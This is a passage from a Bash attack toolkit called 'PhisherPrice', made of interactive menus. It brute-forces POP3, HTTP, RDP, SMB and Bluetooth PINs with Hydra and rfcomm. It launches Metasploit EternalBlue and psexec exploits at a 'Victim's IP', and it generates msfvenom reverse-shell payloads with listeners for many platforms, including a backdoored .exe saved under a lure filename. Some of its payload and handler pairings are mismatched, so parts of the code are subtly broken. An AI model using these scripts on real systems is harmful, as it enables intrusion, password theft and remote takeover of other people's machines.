  echo "${red}Login Failed${reset}"
  echo -e "-------------------------------------------"
fi
        ;;
      7)
        clear
echo "POP3 Password Cracking Script Using Hydra"
echo -e "\n-------------------------------------------"
echo "Enter Known User or User List:"
read -e hydrauser && echo "$hydrauser" >> ~/.bash_history 2>/dev/null
echo "Enter Password List Location:"
read -e hydrapasslist && echo "$hydrapasslist" >> ~/.bash_history 2>/dev/null
echo "Enter IP Address:"
read -e hydraip && echo "$hydraip" >> ~/.bash_history 2>/dev/null

echo -e "\n-------------------------------------------"
echo "Running hydra..."
output=$(hydra -l $hydrauser -P $hydrapasslist -f $hydraip pop3 -V 2>&1)

if echo "$output" | grep -q "1 valid password found"; then
  echo -e "\n-------------------------------------------"
  echo "${green}Login Successful!${reset}"
  echo "Password found: $(echo "$output" | grep -oP '(?<=password: )\S+')"
  echo -e "-------------------------------------------"
else
  clear
  echo -e "\n-------------------------------------------"
  echo "${red}Login Failed${reset}"
  echo -e "-------------------------------------------"
fi
        ;;
      8)
        clear
echo "HTTP Basic Authentication Password Cracking Script Using Hydra"
echo -e "\n-------------------------------------------"
echo "Enter User List Location:"
read -e hydrauser && echo "$hydrauser" >> ~/.bash_history 2>/dev/null
echo "Enter Password List Location:"
read -e hydrapasslist && echo "$hydrapasslist" >> ~/.bash_history 2>/dev/null
echo "Enter IP Address:"
read -e hydraip && echo "$hydraip" >> ~/.bash_history 2>/dev/null
echo "Enter the 401 Login Realm"
read -e hyhost && echo "$hyhost" >> ~/.bash_history 2>/dev/null

echo -e "\n-------------------------------------------"
echo "Running Hydra..."
output=$(hydra -L $hydrauser -P $hydrapasslist $hydraip http-get /$hyhost 2>&1)

if echo "$output" | grep -q "1 valid password found"; then
  echo -e "\n-------------------------------------------"
  echo "${green}Login Successful!${reset}"
  echo -e "-------------------------------------------"
  echo "${cyan}Password:${reset} $(echo "$output" | grep -oP '(?<=login:\s).*$')"
  echo -e "-------------------------------------------"
else
  echo -e "\n-------------------------------------------"
  echo "${red}Login Failed${reset}"
  echo -e "-------------------------------------------"
fi
        ;;
      9)
        clear
echo "RDP Password Cracking Script Using Hydra"
echo -e "\n-------------------------------------------"
echo "Enter the username or username list file path:"
read -e hydrauser8 && echo "$hydrauser8" >> ~/.bash_history 2>/dev/null

echo "Enter the password list file path:"
read -e hydrapasslist8 && echo "$hydrapasslist8" >> ~/.bash_history 2>/dev/null

echo "Enter the target IP address:"
read -e hydraip8 && echo "$hydraip8" >> ~/.bash_history 2>/dev/null

if [ -f "$hydrauser8" ]; then
  hydrauser8="-M $hydrauser8"
fi

echo -e "\n-------------------------------------------"
echo "Running hydra..."
output=$(hydra -t 1 -V -f -l $hydrauser8 -P $hydrapasslist8 rdp://$hydraip8 2>&1)

if echo "$output" | grep -q "1 valid password found"; then
  password=$(echo "$output" | grep -o "Password:.*" | cut -d' ' -f2-)
  echo -e "\n-------------------------------------------"
  echo "${green}Login Successful!${reset}"
  echo "Password: $password"
  echo -e "-------------------------------------------"
else
  clear
  echo -e "\n-------------------------------------------"
  echo "${red}Login Failed${reset}"
  echo -e "-------------------------------------------"
fi
        ;;
      10)
        clear
echo "SMB Password Cracking Script Using Hydra"
echo -e "\n-------------------------------------------"
echo "Enter Known User or User List:"
read -e hydrauser && echo "$hydrauser" >> ~/.bash_history 2>/dev/null
echo "Enter Password List Location:"
read -e hydrapasslist && echo "$hydrapasslist" >> ~/.bash_history 2>/dev/null
echo "Enter the IP Address:"
read -e hydraip && echo "$hydraip" >> ~/.bash_history 2>/dev/null

echo -e "\n-------------------------------------------"
echo "Running hydra..."
output=$(hydra -t 1 -V -f -l $hydrauser -P $hydrapasslist $hydraip smb 2>&1)

if echo "$output" | grep -q "1 valid password found"; then
  echo -e "\n-------------------------------------------"
  echo "${green}Login Successful!${reset}"
  echo -e "-------------------------------------------"
else
  echo -e "\n-------------------------------------------"
  echo "${red}Login Failed${reset}"
  echo -e "-------------------------------------------"
fi
        ;;
      b|B)
        return
        ;;
        q|Q)
        clear
        echo "${red}Exiting PhisherPrice.${green} Goodbye!${reset}"
        exit 0
        ;;
      *)
        echo "Invalid option: $choice"
        ;;
    esac
    echo ""
    read -p "Press enter to continue..."
  done
}

# bluetooth toolkit menu
btoolkit() {
  while true
  do
  clear
	
	echo -e "
┌────────────────────────────────────────────┐
│${red}Bluetooth Toolkit${reset}                           │
├────────────────────────────────────────────┤
│${green}1${reset} │Bluetooth device scanner                 │
│${green}2${reset} │Bluetooth PIN Code Cracker               │
├────────────────────────────────────────────┤
│    b/B To Go To Back ~ q/Q To Exit         │
"├$blue["$red"PhisherPrice$blue]$reset──$blue[$red~$blue]$reset──$blue["$yellow"Bluetooth-Toolkit$blue]:"$reset───┘"
read -r -p"└─────► $reset" choice
    case $choice in
      1)
        clear
echo -e "\e[1;33mbluetooth PIN Code Cracking Script.\e[0m"
echo -e "\n-------------------------------------------"

echo -n "Enter the MAC address of the target device: "
read -e mac_address && echo "$mac_address" >> ~/.bash_history 2>/dev/null
echo -n "Enter the name of the PIN code file: "
read -e pin_file && echo "$pin_file" >> ~/.bash_history 2>/dev/null

clear
echo -e "\n-------------------------------------------"
echo -e "\e[1;34mCracking bluetooth PIN code...\e[0m"
echo -e "-------------------------------------------\n"

while read pin; do
  echo "Trying PIN code: $pin"
  rfcomm connect hci0 "$mac_address" "$pin" 1>/dev/null 2>&1
  
  if [[ $? -eq 0 ]]; then
    echo -e "\n-------------------------------------------"
    echo -e "\e[1;32mPIN code found!\e[0m"
    echo -e "-------------------------------------------"
    echo -e "PIN code: $pin"
    read -p "Press Enter to continue."
    break
  fi
  
done < "$pin_file"

echo -e "\n-------------------------------------------"
echo -e "\e[1;31mPIN code not found.\e[0m"
echo -e "-------------------------------------------"
read -p "Press Enter to continue."
        ;;
      2)
        clear
echo -e "\nBluetooth device scanner"
echo -e "-------------------------------------------\n"

echo "Scanning for nearby devices..."
devices=$(hcitool scan | grep -oP '^\S+\s+\K.*')

if [ -z "$devices" ]; then
  echo -e "\nNo devices found."
  read
fi

echo -e "\n-------------------------------------------"
echo "Nearby devices:"
echo -e "-------------------------------------------\n"

echo "$devices"

echo -e "\n-------------------------------------------"
echo -e "Enter the MAC address of the device to connect: "
read -e mac_address

echo "Connecting to $mac_address..."
rfcomm connect /dev/rfcomm0 "$mac_address" 1 &
sleep 1

if [[ $(echo $?) -ne 0 ]]; then
  echo -e "\nFailed to connect to $mac_address."
  read
fi

echo -e "\nSuccessfully connected to $mac_address."
        ;;
      b|B)
        return
        ;;
        q|Q)
        clear
        echo "${red}Exiting PhisherPrice.${green} Goodbye!${reset}"
        exit 0
        ;;
      *)
        echo "Invalid option: $choice"
        ;;
    esac
    echo ""
    read -p "Press enter to continue..."
  done
}
# Submenu 3 function
submenu3() {
  while true
  do
# Get a list of all available network interfaces
interfaces=$(ip link show | awk -F': ' '{print $2}' | grep -v lo)

# Loop through each interface and check if it is available
for interface in $interfaces; do
    if [[ $(ip link show $interface) ]]; then
        # Get the IP address of the current interface
        ip=$(ip addr show $interface | awk '/inet / {print $2}' | cut -d/ -f 1)

        # Start the appropriate service based on the interface name
        case $interface in
            wlan0|wlp*)
                service postgresql start
                ;;
            eth0|enp*)
                service mysql start
                ;;
            *)
                echo "No service found for interface $interface"
                ;;
        esac
    fi
done
clear
	
echo -e "
┌──────────────────────────────────────────────────────────────────────────┐
│${red}Auto Xsploit${reset}                                                              │
├──────────────────────────────────────────────────────────────────────────┤
│${green}1${reset}  │Scanners                                                              │
│${green}2${reset}  │Windows 7/2008 x64 ONLY by IP         (ms17_010_eternalblue)          │
│${green}3${reset}  │Enable Remote Desktop                 (ms17_010_eternalblue)          │
│${green}4${reset}  │Enable Remote Desktop                 (ms17_010_psexec)               │
│${green}5${reset}  │Windows Vista/XP/2000/2003 ONLY by IP (ms17_010_psexec)               │
│${green}6${reset}  │Windows with a link                   (HTA Server)                    │
│${green}7${reset}  │Windows     --> pwnd.exe (Payload & listener)                         │
│${green}8${reset}  │Windows     --> pwnd.exe (TCP Payload with shikata_ga_nai encoder)    │
│${green}9${reset}  │Windows     --> pwnd.asp (Payload & listener)                         │
│${green}10${reset} │Linux       --> pwnd.py  (Payload & listener)                         │
│${green}11${reset} │MacOS       --> pwnd.jar (Payload & listener)                         │
│${green}12${reset} │MacOS TCP   --> pwnd.macho (Payload & listener)                       │
│${green}13${reset} │Javascript  --> pwnd.jsp (Payload & listener)                         │
│${green}14${reset} │Web         --> pwnd.php (Payload & listener)                         │
│${green}15${reset} │MacOS       --> bind.macho (Bind Shell)                               │
│${green}16${reset} │Backdoor .exe                                                         │
│${green}17${reset} │Bind .exe With Payload & Encode (using shikata_ga_nai)                │
│${green}18${reset} │Android     --> pwnd.apk (payload & listener)                         │
├──────────────────────────────────────────────────────────────────────────┤
│    b/B To Go To Back ~ q/Q To Exit                                       │
"├$blue["$red"PhisherPrice$blue]$reset──$blue[$red~$blue]$reset──$blue["$yellow"Auto Xsploit$blue]:"$reset──────────────────────────────────────┘"
read -r -p"└─────► $reset" choice
    case $choice in
      1)
        scannersmenu
        ;;
      2)
      clear
        echo "${yellow}Victim's IP:${reset}"
read -e r && echo "$r" >> ~/.bash_history 2>/dev/null

msfconsole -q -x " use exploit/windows/smb/ms17_010_eternalblue; set payload windows/x64/meterpreter/reverse_tcp;  set lhost $ip ; set rhost $r ; exploit ; "
        ;;
      3)
      clear
        echo "${yellow}Victim's IP:${reset}"
read -e r && echo "$r" >> ~/.bash_history 2>/dev/null

msfconsole -q -x " use exploit/windows/smb/ms17_010_eternalblue; set payload windows/x64/vncinject/reverse_tcp;  set lhost $ip ; set rhost $r ; set viewonly false ; exploit ; "
        ;;
      4)
      clear
echo "${yellow}Victim's IP:${reset}"
read -e r && echo "$r" >> ~/.bash_history 2>/dev/null

msfconsole -q -x " use exploit/windows/smb/ms17_010_psexec; set payload windows/vncinject/reverse_tcp;  set lhost $ip ; set rhost $r ; set viewonly false ; exploit ; "
        ;;
      5)
      clear
       echo "${yellow}Victim's IP:${reset}" 
read -e r && echo "$r" >> ~/.bash_history 2>/dev/null

msfconsole -q -x " use exploit/windows/smb/ms17_010_psexec; set lhost $ip ; set rhost $r ; exploit ;"
        ;;
      6)
      clear
        echo 'Uripath: (/)'
read -e u && echo "$u" >> ~/.bash_history 2>/dev/null
msfconsole -q -x " use exploit/windows/misc/hta_server; set srvhost $ip; set uripath /$u; set payload windows/meterpreter/reverse_tcp; set lhost $ip ; exploit ;"
        ;;
      7)
      clear
        msfvenom -p windows/meterpreter/reverse_tcp lhost=$ip lport=4444 -f exe > /root/Desktop/pwnd.exe
echo -e "
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!Your payload: ${green}/root/Desktop/pwnd.exe${reset}!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Waiting for listener...
 
"

msfconsole -q -x " use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
        ;;
      8)
      clear
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=4444 -e x86/shikata_ga_nai -b ‘\x00’ -i 3 -f exe > /root/Desktop/pwnd.exe
echo -e "
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!Your payload: ${green}/root/Desktop/pwnd.exe${reset}!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Waiting for listener...
 
"

msfconsole -q -x " use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
        ;;
      9)
      clear
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=4444 -f asp > /root/Desktop/pwnd.asp
echo -e "
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!Your payload: ${green}/root/Desktop/pwnd.asp${reset}!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Waiting for listener...
 
"

msfconsole -q -x " use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
        ;;
      10)
      clear
msfvenom -p python/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/Desktop/pwnd.py
echo -e "
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!Your payload: ${green}/root/Desktop/pwnd.py${reset}!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Waiting for listener...
 
"

msfconsole -q -x " use exploit/multi/handler; set payload python/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
        ;;
      11)
      clear
msfvenom -p java/meterpreter/reverse_tcp lhost=$ip lport=4444 -f jar > /root/Desktop/pwnd.jar
echo -e "
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!Your payload: ${green}/root/Desktop/pwnd.jar${reset}!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Waiting for listener...
 
"

msfconsole -q -x " use exploit/multi/handler; set payload java/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
        ;;
      12)
      clear
msfvenom -p osx/x86/shell_bind_tcp RHOST=$ip LPORT=4444 -f macho > bind.macho
echo -e "
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!Your payload: ${green}/root/Desktop/bind.macho${reset}!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Waiting for listener...
 
"

msfconsole -q -x " use exploit/multi/handler; set payload android/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
        ;;
      13)
      clear
msfvenom -p java/meterpreter/reverse_tcp lhost=$ip lport=4444 -f raw > /root/Desktop/pwnd.jsp
echo -e "
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!Your payload: ${green}/root/Desktop/pwnd.jsp${reset}!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Waiting for listener...
 
"

msfconsole -q -x " use exploit/multi/handler; set payload java/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
        ;;
      14)
      clear
msfvenom -p php/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/Desktop/pwnd.php
echo -e "
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!Your payload: ${green}/root/Desktop/pwnd.php${reset}!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Waiting for listener...
 
"

msfconsole -q -x " use exploit/multi/handler; set payload php/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
        ;;
      15)
      clear
msfvenom -p osx/x86/shell_bind_tcp RHOST=$ip LPORT=4444 -f macho > bind.macho
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!Your payload: ${green}/root/Desktop/bind.macho${reset}!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Waiting for listener...
 
'

msfconsole -q -x " use exploit/multi/handler; set payload android/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
        ;;
      16)
      clear
echo "your .exe location:"
read -e exelocation
msfvenom -x $exelocation -k -p windows/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/Desktop/pornhub.exe
echo -e "
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!Your payload: ${green}/root/Desktop/pornhub.exe${reset}!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Waiting for listener...
 
"

msfconsole -q -x " use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
        ;;
      17)
      clear
echo "your .exe location:"
read -e bindexelocation
msfvenom -x $bindexelocation -k -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=4444 -e x86/shikata_ga_nai -i 3 -b “\x00” -f exe > example.exe
echo -e "
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!Your payload: ${green}/root/Desktop/pornhub.exe${reset}!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Waiting for listener...
 
"

msfconsole -q -x " use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
        ;;
      18)
      clear
msfvenom -p osx/x86/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/Desktop/pwnd.apk
echo -e "
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!Your payload: ${green}/root/Desktop/pwnd.apk${reset}!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Waiting for listener...
 
"

msfconsole -q -x " use exploit/multi/handler; set payload android/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
        ;;
      b|B)
        return
        ;;
        q|Q)
        clear
        echo "${red}Exiting PhisherPrice.${green} Goodbye!${reset}"
        exit 0
        ;;
      *)
        echo "Invalid option: $choice"
        ;;
    esac
    echo ""
    read -p "Press enter to continue..."
  done
}
# Scanners Submenu function
scannersmenu() {
  while true
  do
clear
	
echo -e "
┌────────────────────────────────────────────────────────────────────────────────────────────────────┐
│${red}Auto Scanners${reset}                                                                                       │
├────────────────────────────────────────────────────────────────────────────────────────────────────┤
│${green}1${reset} │Test Target If They are Vulnerable To (ms17_010)                                                 │
│${green}2${reset} │Determine Named Pipes Over SMB (pipe_auditor)                                                    │
│${green}3${reset} │Discover DCERPC Services (pipe_dcerpc_auditor)                                                   │
│${green}4${reset} │Scans Host & determines If They Support SMB2                                                     │
│${green}5${reset} │Enumerate The Users On The System (smb_enumusers)                                                │
│${green}6${reset} │Attempt To Login Via SMB (smb_login)                                                             │
│${green}7${reset} │Brute-forces SID Lookups to determine what local users exist the system (SMB_LOOKUPSID)          │
│${green}8${reset} │Determine The Version Of The SMB Service That Is Running (smb_version)                           │
│${green}9${reset} │Web App Vuln Scanner [ BETA ]                                                                    │
├────────────────────────────────────────────────────────────────────────────────────────────────────┤
│    b/B To Go To Back ~ q/Q To Exit                                                                 │
"├$blue["$red"PhisherPrice$blue]$reset──$blue[$red~$blue]$reset──$blue["$yellow"Scanners$blue]:"$reset────────────────────────────────────────────────────────────────────┘"
read -r -p"└─────► $reset" choice

    case $choice in
      1)
        clear
echo "${yellow}Victim's IP:${reset}"
read -e r && echo "$r" >> ~/.bash_history 2>/dev/null

msfconsole -q -x " use auxiliary/scanner/smb/smb_ms17_010; set rhosts $r ; exploit ;exit ;"
        ;;
      2)
clear
echo "${yellow}Victim's IP:${reset}"
read -e r && echo "$r" >> ~/.bash_history 2>/dev/null

msfconsole -q -x " use auxiliary/scanner/smb/pipe_auditor; set rhosts $r ; exploit ;exit ;"
        ;;
      3)
clear
echo "${yellow}Victim's IP:${reset}"
read -e r && echo "$r" >> ~/.bash_history 2>/dev/null

msfconsole -q -x " use auxiliary/scanner/smb/pipe_dcerpc_auditor; set rhosts $r ; exploit ;exit ;"
        ;;
      4)
clear
echo "${yellow}Victim's IP:${reset}"
read -e r && echo "$r" >> ~/.bash_history 2>/dev/null

msfconsole -q -x " use auxiliary/scanner/smb/smb2; set rhosts $r ; exploit ;exit ;"
        ;;
      5)
clear
echo "${yellow}Victim's IP:${reset}"
read -e r && echo "$r" >> ~/.bash_history 2>/dev/null

msfconsole -q -x " use auxiliary/scanner/smb/smb_enumusers; set rhosts $r ; exploit ;exit ;"
        ;;
      6)
clear
echo "${yellow}Victim's IP:${reset}"
read -e r && echo "$r" >> ~/.bash_history 2>/dev/null
echo "Victim's Password:"
read -e passmb && echo "$passmb" >> ~/.bash_history 2>/dev/null
echo "Victim's User Account:"
read -e accsmb && echo "$accsmb" >> ~/.bash_history 2>/dev/null

msfconsole -q -x " use auxiliary/scanner/smb/smb_login; set rhosts $r ; set SMBPass $passmb ; set SMBUser $accsmb ; exploit ;exit ;"
        ;;
      7)
clear
echo "${yellow}Victim's IP:${reset}"
read -e r && echo "$r" >> ~/.bash_history 2>/dev/null

msfconsole -q -x " use auxiliary/scanner/smb/smb_lookupsid; set rhosts $r ; exploit ;exit ;"
        ;;
      8)
clear
echo "${yellow}Victim's IP:${reset}"
read -e r && echo "$r" >> ~/.bash_history 2>/dev/null

msfconsole -q -x " use auxiliary/scanner/smb/smb_version; set rhosts $r ; exploit ;exit ;"
        ;;
      9)
      clear
echo "Common Web Application Vulnerability Scanner [${green}BASH${reset} \ ${yellow}BETA${reset}]"
echo ""
# Read input from user and store in history file
read -e -p "Enter URL or IP address to scan: " url && echo "$url" >> ~/.bash_history 2>/dev/null

# Set variables
search_query=$(echo "$url"| sed 's#[/:]#\\#g') # escape forward slashes for regex

# Truncate search query if it exceeds maximum length
# This is done to limit the length of the search query that is displayed to the user and to prevent it from becoming too long and difficult to read or fit on the screen.
max_length=40
if (( ${#search_query} > $max_length )); then
    truncated_query=$(echo "${search_query:0:$max_length}...")
else
    truncated_query=$search_query
fi

# Print output
printf "\n\n${green}Host: %s\n" "${reset}$url"

# Check if input is a valid URL or IP address
if ! [[ $url =~ ^(([0-9]{1,3}\.){3}[0-9]{1,3})|([a-zA-Z]+://.*)$ ]]; then
    printf "${red}Error:${reset} Invalid URL or IP address entered.\n"
fi
# Set cURL options to verify SSL certificate
user_agents_file="./main/user_agents.txt"
user_agents=()
while read -r line; do
    user_agents+=("$line")
done < "$user_agents_file"
selected_user_agent=${user_agents[RANDOM % ${#user_agents[@]}]}
echo "$green Using user agent:$reset $selected_user_agent"
echo ""
curl_options=(
    --silent
    --show-error
    --max-time 10
    --insecure
    --user-agent "$selected_user_agent"
)
output=$(curl "${curl_options[@]}" "$url")
http_code=$(curl -o /dev/null -s -w "%{http_code}\n" "${curl_options[@]}" "$url")
    # Check if SSL certificate is valid
  if (( http_code == 0 )); then
    printf "${red}Error:${reset} Unable to connect to URL or IP address.\n"
  elif (( http_code == 200 )); then
    # Array of regular expressions that match common web application vulnerabilities and their brief descriptions
    declare -A vulnerabilities=(
    ["SQL Injection"]="/'.*\\$/i" 
    # Malicious SQL code is inserted into an application's input and executed by the database.
    ["XSS"]="/<script>alert\\('XSS'\\);<\\/script>/i"
    # Malicious scripts are injected into a web page and executed by unsuspecting users.
    ["File Inclusion"]="/(include|require)(_once)?[\\s]*(\\(|[\"'])[\\s]*([A-Za-z0-9_]+)(\\.[A-Za-z]+)?([\"']|\\))/i"
    # Unsanitized user input is used to load a file or resource that should not be publicly accessible.
    ["Directory Traversal"]="/\.\.[\/\\\]/i"
    # User input is used to navigate to directories outside of the intended directory hierarchy.
    ["Remote File Inclusion"]="/(include|require)(_once)?[\s]*[\(\"']http(s)?:\/\/(.*)[\)\"']/i"
    # Malicious code is included from a remote server allowing an attacker to execute code on the server.
    ["Command Injection"]="/;.*;/i"
    # User input is passed directly to the command line allowing an attacker to execute arbitrary commands.
    ["Cross-Site Request Forgery (CSRF)"]="/<form.*action=[\"'](?!\s*https?:\/\/".$_SERVER['HTTP_HOST'].")[^\"']*\"/i"
    # An attacker submits unauthorized requests on behalf of an authenticated user.
    ["Unrestricted File Upload"]="/(jpg|jpeg|png|gif|svg|pdf|doc|docx|xls|xlsx|ppt|pptx|csv|txt)[\s]*$/i"
    # Malicious files are uploaded to a server and executed allowing an attacker to execute code on the server.
    ["Password Cracking"]="/\bpassword\b|\bpwd\b|\bpasscode\b|\bpin\b/i"
    # Weak password policies allow attackers to guess or crack passwords.
    ["Session Hijacking"]="/document\.cookie/i" #nst
    # An attacker gains access to a user's session ID and uses it to impersonate the user.
    ["Broken Auth and Session Management"]="/PHPSESSID|session_id|JSESSIONID/i"
    # Poorly implemented authentication and session management allow attackers to bypass authentication and hijack sessions.
    ["Remote Code Execution"]="/eval|exec|passthru|shell_exec|system|popen|pcntl_exec|proc_open/i"
    # User input is passed directly to the command line allowing an attacker to execute arbitrary commands.
    ["Local File Inclusion"]="/(include|require)(_once)?[\s]*(\(|[\"'])\.\.\/(.*)([\"']|\))/i"
    # Unsanitized user input is used to load a file or resource that should not be publicly accessible.
    ["Server Side Request Forgery (SSRF)"]="/curl|file_get_contents|fsockopen|pfsockopen|fopen|readfile|pop|imap|smtp|socket|ftp_(connect|login)|mysql_(connect|pconnect)/i" #sc@nst
    # An attacker sends requests to internal or external servers on behalf of the vulnerable application.
    ["XML External Entity (XXE) Injection"]="/<!ENTITY.*SYSTEM.*>/i"
    # An attack where external entities are injected into an XML document leading to the disclosure of sensitive information or execution of remote code.
    ["Cross-Site Script Inclusion (XSSI)"]="/[a-zA-Z0-9_]+\s*=\s*\[\s*\{.*\"/i"
    # An attack where an attacker can load a web page's JavaScript data from an external source allowing them to execute malicious code on the victim's browser.
    ["Server-Side Template Injection (SSTI)"]="/\{\{.*\}\}/i"
    # An attack where an attacker injects malicious code into a template that is parsed and executed on the server-side.
    ["HTML Injection"]="/<\s*script\s*>.*<\s*\/script\s*>/i" #scns
    # This is a vulnerability where an attacker can inject malicious HTML code into a web page. This can allow the attacker to steal sensitive information or execute arbitrary code in the user's browser.
    ["LDAP Injection"]="/[\|&;\$><\(\)]/i"
    # An attack where an attacker can inject malicious input into an LDAP search filter or command allowing them to access or modify sensitive information in the LDAP directory.
    ["XPath Injection"]="/'[^\']*'/i"
    # An attack where an attacker injects malicious input into an XPath query allowing them to access or modify sensitive information.
    ["Code Injection"]="/{{.*\..*}}|{{.*\|.*system.*}}|{{.*\|.*passthru.*}}/i"
    # An attack where an attacker can inject malicious code into a web application allowing them to execute arbitrary code on the server.
    ["Object Injection"]="/unserialize|__wakeup|__destruct/i"
    # An attack where an attacker can manipulate serialized objects in a web application to execute arbitrary code.
    ["Cross-Domain Scripting"]="/<script.*src=[\"'](?!https?:\/\/".$_SERVER['HTTP_HOST'].")[^\"']*\"/i"
    # An attack where an attacker can inject a script into a web page from an external domain allowing them to steal sensitive information from the victim's browser.
    ["HTTP Response Splitting"]="/\r\n|\n|\r/i"
    # An attack where an attacker can insert additional HTTP headers into a response allowing them to manipulate the behavior of the web application or perform phishing attacks.
    ["Buffer Overflow"]="/%s|%x|%n|%h|%p|%s|%u|%hn|%hhn|%lx|%lX|%llX/i"
    # An attack where an attacker can exploit a buffer overflow vulnerability in a web application to execute arbitrary code on the server.
    ["Format String Attack"]="/%n|%s|%p|%x|%d|%i|%o|%u|%e|%c|%f|%g|%h|%n|%hhn|%hn|%ln|%lln/i"
    # An attack where an attacker can exploit a format string vulnerability in a web application to execute arbitrary code on the server.
    ["Command Injection (Windows)"]="/\b(com|exe|bat|cmd)(\s*\/c|\s+\-c|\s+\-command|\s+\/k|\s+\-k|\s+\-batch|\s+\/b)\b/i"
    # An attack where an attacker can inject malicious input into a command executed on a Windows system allowing them to execute arbitrary code on the server.
    ["Insecure Cryptographic Storage"]="/(md5|sha1|sha256|sha384|sha512|crypt)\b/i"
    # An attack where an attacker can exploit weak cryptographic hashing algorithms to gain access to sensitive information.
    ["Insecure Direct Object References"]="/\/(users|accounts|orders)\/\d+/i"
    # Unvalidated or insufficiently validated user input is used to access sensitive information or functionality directly through URL manipulation.
    ["Insufficient Logging and Monitoring"]="/error_log\(|trigger_error\(|Exception|ERROR/i"
    # Insufficient or nonexistent logging and monitoring capabilities make it difficult to detect and respond to security incidents.
    ["Security Misconfiguration"]="/(phpinfo|display_errors|allow_url_include)\b/i"
    # Incorrectly configured server settings or application properties can result in vulnerabilities that can be exploited by attackers.
    ["Cross-Site Script Inclusion (CSSI)"]="/<link.*href=[\"'](?!\s*https?:\/\/".$_SERVER['HTTP_HOST'].")[^\"']*\"/i"
    # Unsanitized user input is used to include external resources such as stylesheets that could potentially be controlled by an attacker.
    ["Click Fraud"]="/(pay per click fraud|click fraud|ppc fraud|clickbot|click-spam|click spam|ad fraud)/i"
    # An attack where an attacker generates fake clicks on online advertisements to increase their revenue or to exhaust a competitor's advertising budget."
    ["Broken Access Control"]="/(path traversal|directory traversal|unauthorized access|access control|forceful browsing|privilege escalation|authorization bypass|insecure direct object reference|IDOR|access control matrix)/i"
    # An attack where an attacker is able to gain unauthorized access to resources or actions that should be protected by access controls allowing them to steal sensitive information or perform malicious actions.
    ["Clickjacking"]="/(clickjacking|UI redressing|UI redress attack|user interface redressing|user interface redress attack|UI overlay attack|overlay attack)/i" #root@nst
    # An attack where an attacker tricks a user into clicking on a button or link that is disguised as something else such as a harmless button but actually performs a malicious action such as initiating a transfer of funds or installing malware.
    ["Hidden Form Fields"]="/<input\s+type\s*=\s*[\"']?\s*hidden\s*[\"']?\s*>/i"
    # This is a type of vulnerability where a form field is hidden from the user but still included in the form submission. This can allow attackers to submit unexpected data potentially bypassing form validation or performing other malicious actions.
    ["Shellshock"]="/(bash( |%20|\\+|%2[Bb])?-c|\$\(printf|echo -ne|wget.*\?cmd=|curl.*\?data=.*bash|User-Agent:.*[\(\)\{\};\'\"\\\`\$][\(\)\{\};\'\"\\\`\$]|shellshock)/i"
    # Shellshock is a security vulnerability in the Unix Bash shell that was discovered in 2014. It allows an attacker to execute arbitrary code on a target system by exploiting a flaw in how Bash evaluates environment variables. The vulnerability affects many versions of Bash on Unix-based operating systems, including Linux and Mac OS X. It can be used to launch a variety of attacks, including remote code execution, privilege escalation, and data theft. The vulnerability has been patched, but it remains a risk for systems that have not been updated.   
    #
    ###################
    # LEAVE ME INTACT #
    ###################
    #   RJWDLY4EVA    #
    ###################
    #
    # //ADD FROM HERE
    # Feel Free To Add More
    )
    
    # Scan for vulnerabilities
    found_vulns=()
    for name in "${!vulnerabilities[@]}"; do
        if [[ $output =~ ${vulnerabilities[$name]} ]]; then
